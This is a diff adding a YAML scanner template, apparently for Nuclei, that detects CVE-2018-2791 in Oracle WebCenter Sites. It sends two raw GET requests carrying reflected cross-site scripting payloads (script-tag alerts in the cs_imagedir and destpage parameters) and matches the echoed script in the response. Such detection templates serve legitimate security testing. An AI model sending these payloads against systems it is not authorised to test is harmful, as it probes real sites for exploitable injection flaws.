@@ -1,0 +1,30 @@
+id: cve-2018-2791
+
+info:
+  name: Multiple XSS Oracle WebCenter Sites
+  author: leovalcante
+  severity: medium
+  description: Check cve-2018-2791 for Oracle WebCenter Sites.
+  reference: https://www.exploit-db.com/exploits/44752
+  tags: oracle,webcenter sites,wcs,xss
+
+requests:
+  - raw:
+      - |
+        GET /cs/Satellite?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq"><script>alert(24)</script> HTTP/1.1
+        Host: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.9
+      - |
+        GET /cs/Satellite?destpage="<h1xxx<scriptalert(1)</script&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
+        Host: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.9
+    matchers:
+      - type: word
+        words:
+          - '<script>alert(24)</script>'
+        part: body
+    stop-at-first-match: true
